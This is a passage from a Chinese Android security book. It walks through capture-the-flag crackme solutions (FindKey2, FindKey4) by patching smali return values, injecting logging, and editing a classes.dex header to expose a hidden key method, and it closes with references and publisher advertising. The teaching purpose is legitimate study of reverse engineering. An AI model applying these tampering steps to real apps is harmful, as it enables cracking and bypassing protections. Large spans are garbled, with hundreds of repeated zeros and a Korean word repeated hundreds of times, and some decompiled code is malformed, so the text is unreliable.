        this.this$0.aView.setText(com.example.helloworld.Security.DecryptStr("-188e1b6d75d7a81deeeb 5aaf57c0577d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

可看到integer类型的stairs、myStairs变量，变量stairs被赋予了随机生成的值。用户每次点击按钮，myStairs变量值会增加1。myStairs和stairs变量值相同时，使用SEED加密的密钥“-188e1b6d75d7a81deeb5aaf57c0577d00

如果把赋予stairs的值396707144修改为很小的值，就可以轻松获取密钥。

下面试着将变量修改为任意值。

#### 代码7-2 Java代码

public int randomRange(int p11)
{
    v0 = ((int) (Math.random() * 10000.0)) * p11);
    return v0;
}

此Java代码是将随机生成的值与得到的属性值 $ p_{11} $相乘后返还的函数。将此代码转换为smali代码后，结果如下。

##### 代码7-3 smali代码

.method public randomRange(I)I
.registers 7
.parameter "a1"
.prologue
.line 45

invoke-static {}，Ljava/lang/Math;->random()D

move-result-wide v1

const-wide v3, 0x40c3880000000000L

mul-double/2addr v1, v3

double-to-int v1, v1

mul-int v0, v1, p1

.line 47

.local v0, random:I

return v0

.end method

smali代码中有很多关于形态转换的代码，但解决此问题最重要的是return v0的值。上面存在何种代码并不重要，只要能修改返回值即可，所以只需要把v0变量的值设置为很小的数并返回。

##### 代码7-4

.method public randomRange(I)I
.registers 7
.parameter "a1"
.prologue
.line 45
invoke-static {}，Ljava/lang/Math;->random()D
move-result-wide v1
const-wide v3, 0x40c3880000000000L
mul-double/2addr v1, v3
double-to-int v1, v1
mul-int v0, v1, p1
.line 47
.local v0, random:I
const/4 v0, 0x1
return v0
.end method

将返回的v0变量值修改为const/4 v0, .0x1。解释如下：

const/4 v0, 0x1

代码将4位常数 $ (0x1) $赋予v0变量(将1赋予v0)。可以向const/4赋予-8~7的数字。修改smali代码的返回值后，使用smali-1.4.jar生成classes.dex文件即可看到如下Java代码。

代码7-5

public int randomRange(int p6, int p7)
{
    Math.ceil((Math.random() * ((double) p6)) * ((double) p7)));
    return 1;
}

那么，能否将return v0直接修改为return 1这种格式呢？因为寄存器会出现如下错误，所以必须使用上述方法。

com/example/helloworld/MainActivity.smali[216,11] mismatched input '0x1'
expecting REGISTER
com/example/helloworld/MainActivity.smali[216,11] mismatched input '1'
expecting REGISTER

# 1. 返回字符串

只需知道如何修改常数返回值即可解决FindKye2.apk问题，不过还是介绍一下修改字符串返回值的方法。

与之前修改常数返回值一样，也使用相同方法修改字符串。

##### 代码7-6

public String myString()
{
    return "www.boanproject.com";
}
.smali代码如下。

##### 代码7-7

.method public myString()Ljava/lang/String;
.registers 2
.prologue
.line 115
const-string v0, "www.boanproject.com"
return-object v0
.end method

代码7-7是代码7-6的Java代码转换为smali代码的结果，代码中的myString方法是只返回“www.boanproject.com”字符串的简单代码。

如果需要修改代码7-7返回的字符串，只需修改const-string v0和“www.boanproject.com”引号中的内容。

但是, 如果从其他类继承或被编码/加密时, 是不能直接修改内容的, 所以使用const-string v0、“Helloworld”方式重新对v0变量进行赋值。

代码7-8
const-string v0, "www.boanproject.com"
.method public myString()Ljava/lang/String;
.registers 2
.prologue
.line 74
const-string v0, "www.boanproject.com" ←可以直接修改
const-string v0, "HelloWorld" ←向v0变量代入新字符串后也可修改
return-object v0
.end method

对修改的smali代码重新打包后查看Java代码，可以看到保存了修改后的值。

代码7-9

public String myString()
{
    return "HelloWorld";
}

我们可以这样轻松修改返回的字符串。

# 2. 记录日志文件

我们有时需要知道apk文件会使用哪种方式生成哪些值。此时如果把需要的值记录为日志，就会很方便。制作App时，如果想在需要的地方使用vervose日志，就会使用Log.v方法，此API的使用方法如下所示。

Log.v("LOGLOG", "www.boanproject.com")

使用API后，DDMS开发工具的Log窗口会显示日志，如图7-16所示。

 </div>

输出所需区域的日志以查看输出值。

代码7-10

.method public myString()Ljava/lang/String;
.registers 2
.prologue
.line 74
const-string v0, "www.boanproject.com" ←可以直接修改
const-string v0, "HelloWorld" ←向v0变量代入新字符串后也可修改
const-string v1, "APKLOG"
invoke-static {v1, v0},
    Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I
    #v1 = "APKLOG"
    #v0 = "HelloWorld"
return-object v0
.end method

开发Android App时，如果想在需要的部分使用vervose日志，可以通过Log.v("APKLOG", "Helloworld")方式使用Log.v方法。

# 3. 记录常量日志

与之前添加字符日志时一样，Log.v方法原型中的两个参数值都必须是字符。查看常量值时需要转换格式。Java语言可以使用String.Format（“%s%d”、“字符”、常量）转换各种格式的值。也可以使用String.Format将常量转换为字符后，使用Log.v输出日志。

public int randomRange(int p10, int p11)
{
    v0 = ((int) Math.ceil(((Math.random() * ((double) p10)) * ((double) p11)));
    v6 = new Object[1];
    v6[0] = Integer.valueOf(v0);
    android.util.Log.v("APKLOG", String.format("LOGLOG %d", v6));
    return v0;
}

 </div>

在需要输出常数日志的方法底部添加smali代码。

此过程中需要调整相关方法使用的寄存器数量，否则可能发生崩溃（crash）。

虽然情况可能略有不同，但比原先增加4~5个寄存器后就能正常运行。

.method public myString()Ljava/lang/String;
.registers 2
像这样将method public myString()Ljava/lang/String; 方法底部.registers后面的数字增加2~3个即可。

代码7-12

const-string v4, "APKLOG"
const-string v5, "LOGLOG %d"

const/4 v6, 0x1
new-array v6, v6, [Ljava/lang/Object;
const/4 v7, 0x0
invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
↑

此处会赋予Integer变量。需要将此处的v0值调整至匹配输入结果值的部分。

move-result-object v8
aput-object v8, v6, v7
invoke-static {v5, v6}, Ljava/lang/String;->format(Ljava/lang/String;
[Ljava/lang/Object;)Ljava/lang/String;

move-result-object v5
invoke-static {v4, v5}, Landroid/util/Log;->
v(Ljava/lang/String;Ljava/lang/String;)I

 </div>

日志输出完毕。

# 4. 最终结果

前面介绍了修改常数和字符串返回值的方法，下面求解FindKey2.apk的值。代码7-12修改了之前的字符串返回值，允许输出字符日志。代码7-13为了输出日志，使用String.Format修改了

Integer格式的值，返回值也改成了比较小的值。将还需要爬的台阶数修改为比较小的值即可轻松获得需要的密钥。

代码7-13

public String myString()
{
    v3 = new Object[1];
    v3[0] = "www.boanproject.com";
    android.util.Log.v("APKLOG", String.format("LOGLOG %s", v3));
    return "HelloWorld";
}

public int randomRange(int p11)
{
    v6 = new Object[1];
    v6[0] = Integer.valueOf(((int)(Math.random() * 10000.0)) * p11));
    android.util.Log.v("APKLOG", String.format("LOGLOG %d", v6));
    return 1;
}

 </div>

### 7.4 Android App 试题 4

最后的Android App试题没有特定的故事背景，目的是为了检查各位是否完全掌握了Android App头信息。因为是最后一题，所以为了获取密钥需要执行多个复杂步骤。

##### http://codeengn.com/challenges/smartapp/04

现在开始解题。与之前的过程相同，即使使用dex2jar、androguard等分析工具查看类，也找不到特别的思路。查看图7-20的zFindKey()函数或图7-21的MainActivity也找不到重要信息。

 </div>

 </div>

各位可能以为像前面的代码那样输入0c9e938c9a6a58e9ca93289c8455b1dd462a1b722f7e1c11a34f7983260ab992就会显示密钥，但题目不会那么简单。

上述代码使用了 SHA-2（SHA-256）算法，如果输入的答案加密后与0c9e938c9a6a58e9ca93289c8455b1dd462a1b722f7e1c11a34f7983260ab992相同，就会显示“答案正确”。那么，在哪里可以找到密钥呢？这就是问题的核心。

FindKey4.apk有2个类。在哪里才能找到连MainActivity和zFindKey中也找不到的密钥呢？找到后又如何得知代码的构成方式呢？

下面逐步查找这些问题的答案吧。

第一，使用strings查看dex字符串。查看字符串时可以找到可疑的散列值（0c9e938...）。

 </div>

在此也能找到可疑的散列值（a49895...）。

 </div>

从图7-24中可以看到helloWorldA、helloWorldB、helloWorldC、helloWorldD。仔细查看图7-27后，只能看到A、B、C这3个函数，但此处可以看到函数D。

ཀ་ཀ་ཀ་ཀ་

 </div>

如图7-25所示，使用JD-GUI就能显示不一样的结果吗？

public void onClick(View paramAnonymousView)
{
    Object localObject = "";
    String str1 = MainActivity.this.editText.getText().toString();
    try
    {
        byte[] arrayOfByte = MessageDigest.getInstance("SHA-256").digest(str1.getBytes("UTF-8"));
        StringBuffer localStringBuffer = new StringBuffer();
        for (int i = 0; i++)
        {
            if (i >= arrayOfByte.length)
            {
                String str3 = localStringBuffer.toString();
                localObject = str3;
                if (!(String)localObject).equals("0c9e938c9a6a58e9ca93289c8455b1dd462a1b722f7e1c11a34f7983260ab992"))
                break;
                MainActivity.this.aView.setText("Correct! 링크팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 팀 

##### 图7-25 使用JD-GUI查看结果

 </div>

完全没有任何不同。如图7-27所示，使用最强大的调试工具IDA Pro就会显示不同结果吗？

 </div>

只能看到A、B、C这3个函数，没什么不同。这是因为生成的classes.dex文件中隐藏了可以获取密钥的函数。虽然使用了相同的文件，但是在图7-28的方法列表中可以看到helloWorldD方法。

 </div>

修改前的原文件是如图7-29所示的classes.dex文件。

 </div>

此处隐藏了定义密钥的helloworldD方法。是如何隐藏的呢？将方法目录中定义的虚拟方法（virtual method）数量改为“\x00”，将方法属性和访问地址改为“\x00”。是不是很简单呢？这道题有点像脑筋急转弯吧。

 </div>

如图7-31所示进行修改，逐个查看修改内容。

 </div>

⑪是virtual method count。图7-31中应该只能看到HelloWorldA... HelloWorldD。因为只有HelloWorldD方法在代码中是看不到的，所以可以判断出只隐藏了1个virtual method，故修改为0x1。

首先查看③，③是方法的ACCESS FLAG。一开始读取classes.dex时，因为HelloWorldA、HelloWorldB、HelloWorldC等方法都是“public”，所以视为“public”并设置为0x1。

④是以小端序输入Virtual Method Address的部分。

使用下列方法查找地址。方法之前按照一定顺序排列，所以helloworldc后面会跟着helloworldD方法，这很容易推断。

 </div>

如图7-32所示，方法是在地址0xCCE(...1A 00 5B 00 11 00)结束的。之后的“0x00”2字节表示方法已结束，所以helloWorldD的起始地址应该是0xCD0。

下面进行修改。

☐ 将☑的Virtual Method Count值 “0x0” 改为 “0x01”。

☐ 将②的ACCESS FLAG值 “0x00” 改为 “0x01”。

☐ 修改④的helloWorldD方法的地址。因为helloWorldC方法地址是小端序0xE4 0x19，所以首先放入该值，然后用之前找到的0xCD0替换。但图7-33中标注为offset的值必须是0xCD0。输入0xE4 0x19值后，调整ubyte val[0]值以匹配0xCD0值。

 </div>

将值208赋予ubyte val[0]时，会变为0xCD0。接着需要修改②的index值。如图7-34所示，按照19、1A、1B的顺序依次进行。此时可能会认为next offset部分要输入1C，其实不然。

 </div>

因为offset的设置如图7-35所示。

 </div>

所以最终要输入的index是0x1F。将⑳的值修改为0x1F。

经过整理，修改后的值如下。

 $$ \textcircled{31}0x00\to0x01 $$ 

 $$ \textcircled{2}0x00\to0x1£ $$ 

 $$ \textcircled{3}0x00\to0x01 $$ 

④ 0x00 → 0xD019

修改后，在FindKey4.apk文件中原先的classes.dex文件里添加上述内容，并替换成修改后的classes.dex文件。然后使用androguard查看代码，如图7-36所示。

 </div>

可以在图7-36中看到v11[v9] ^ 240，将240转换为16进制就是0xf0。接着如图7-37所示，使用XOR运算获取密钥即可。

 </div>

 </div>

### 7.5 小结

本章通过黑客大赛试题的解题过程，帮助各位复习了之前介绍过的内容。Android App相关试题已经是黑客大赛的固定项目。解答黑客大赛试题的好处在于，各位可以明确以后的学习方向。通过解决安全专家设置的试题，希望大家能总结自己之前学过的内容，也希望各位能学习到最新的热门技术。

## 参考网站

□ Automated Deobfuscation of Android Applications(Development & Security By Jurriaan Bremer @skier_t)

http://jbremer.org/automated-deobfuscation-of-android-applications/

□ Dalvik-Virtual Machine(Indian Journal of Engineering)

http://www.discovery.org.in/PDF_Files/IJE_20121122.pdf

□ Dalvik Virtual Machine

http://blog.naver.com/PostView.nhn?blogId=visualc98&logNo=63464875

☐ Dex Education: Practicing Safe Dex(Tim Strazzere, Blackhat USA 2012)

http://www.strazzere.com/papers/DexEducation-PracticingSafeDex.pdf

☐ Reversing Android(Meeting #Hackerzvoice, 5 mars 2011)

http://hackerzvoice.net/repo_hzv/meetings/diordna-hzv.pdf

☐ Reversing Android Apps: Hacking and cracking Android apps is easy (DREAMLAB Technologies)

http://www.floyd.ch/download/Android_0sec.pdf

Reverse Engineering Of Malware On Android(SANS Institute InfoSec Reading Room)

http://www.sans.org/reading_room/whitepapers/pda/reverse-engineeringmalware-android_33769

□ Android App安全漏洞检测环境搭建方法 v2.0(LYCAN, 2012-03-09)

http://www.hackerschool.org/Sub_Html/HS_Posting_Images/images/android_app_pentest_setting_v2_0.pdf

□ Google Play的Dex Dump安装页面

https://play.google.com/store/apps/details?id=jp.itplus.android.dex.dump

□ Google Play的Terminal IDE安装页面

https://play.google.com/store/apps/details?id=com.spartacusrex.spartacuside&feature=related_apps#?t=W251bGwsMSwxLDEwOSwiY29tLnNwYXJ0YWN1c3JleC5zcGFydGFjdXNpZGUiXQ

感谢各位读完本书。移动App服务诊断业务已经成为安全检测的必选项目，移动恶意代码也已进化到可与PC病毒比肩的地步。目前，个人用户使用移动设备的时间已经超过了PC的使用时间，所以我们需要共同关注移动领域的安全问题。

从移动设备派生出来的设备越来越多，好像只要能穿戴在身上的东西就都能做成移动设备。这些设备也会面临相同的安全问题，安全专家需要紧跟这种趋势，不断进行研究。我们作者团队也会坚持钻研，以后也会以图书形式公布这种新环境下的研究成果。

# 图灵社区 ituring.cn

### ——最前沿的IT类电子书发售平台

电子出版的时代已经来临。在许多出版界同行还在犹豫彷徨的时候，图灵社区已经采取实际行动拥抱这个出版业巨变。作为国内第一家发售电子图书的IT类出版商，图灵社区目前为读者提供两种DRM-free的阅读体验：在线阅读和PDF。

相比纸质书，电子书具有许多明显的优势。它不仅发布快，更新容易，而且尽可能采用了彩色图片（即使有的书纸质版是黑白印刷的）。读者还可以方便地进行搜索、剪贴、复制和打印。

图灵社区进一步把传统出版流程与电子书出版业务紧密结合，目前已实现作译者网上交稿、编辑网上审稿、按章发布的电子出版模式。这种新的出版模式，我们称之为“敏捷出版”，它可以让读者以较快的速度了解到国外最新技术图书的内容，弥补以往翻译版技术书“出版即过时”的缺憾。同时，敏捷出版使得作、译、编、读的交流更为方便，可以提前消灭书稿中的错误，最大程度地保证图书出版的质量。

优惠提示：现在购买电子书，读者将获赠书款20%的社区银子，可用于兑换纸质样书。

### ——最方便的开放出版平台

图灵社区向读者开放在线写作功能，协助你实现自出版和开源出版的梦想。利用“合集”功能，你就能联合二三好友共同创作一部技术参考书，以免费或收费的形式提供给读者。（收费形式须经过图灵社区立项评审。）这极大地降低了出版的门槛。只要你有写作的意愿，图灵社区就能帮助你实现这个梦想。成熟的书稿，有机会入选出版计划，同时出版纸质书。

图灵社区引进出版的外文图书，都将在立项后马上在社区公布。如果你有意翻译哪本图书，欢迎你来社区申请。只要你通过试译的考验，即可签约成为图灵的译者。当然，要想成功地完成一本书的翻译工作，是需要有坚强的毅力的。

### ——最直接的读者交流平台

在图灵社区，你可以十分方便地写作文章、提交勘误、发表评论，以各种方式与作译者、编辑人员和其他读者进行交流互动。提交勘误还能够获赠社区银子。

你可以积极参与社区经常开展的访谈、乐译、评选等多种活动，赢取积分和银子，积累个人声望。

# Android恶意代码分析与渗透测试完美指南！

近几年，移动应用发展迅猛，几乎覆盖了社会生活的方方面面；其安全性也越来越受到重视。本书从专业分析人员角度详细阐述了Android恶意代码的散播渠道及其引发的威胁，并从实战层面介绍了代码的分析环境、分析方法、预防方法等，读者不仅能通过渗透测试检验方法掌握Android漏洞诊断的基本概念，还可在多个项目中获得可直接运用于实际业务的技术和流程。

### 本书特色

从环境构建到分析，涵盖服务体系全过程

O. 以线上/线下技巧为基础，展现虚拟环境渗透测试真方法

### 本书结构

本书由“恶意代码分析”和“移动服务诊断”两大主题组成。各章节包含了分析步骤，作者们还亲自编写了黑客大赛应用程序试题，读者可以借此复习学过的内容。

O Android应用程序分析环境构建

○ Android应用程序结构分析与各领域不同要素威胁

恶意代码分析工具讲解与具体示例

O Android服务诊断方法与过程

O Android黑客大赛试题详解与深入练习

### 读者对象

本书面向移动安全分析领域的入门者和一线技术人员，同时适合以下读者。

○ 想学习移动恶意代码分析技术的读者：

○ 想学习移动入侵/安全诊断工具的读者

☐ 想全面了解移动安全威胁的读者

○ 想理解并实际运用移动服务诊断方法的读者

### !!

图灵社区：iTuring.cn

热线：(010)51095186转600

分类建议 计算机/网络安全

9 7 8 7 1 1 5 3 9 5 9 3 11>

定价：79.00元

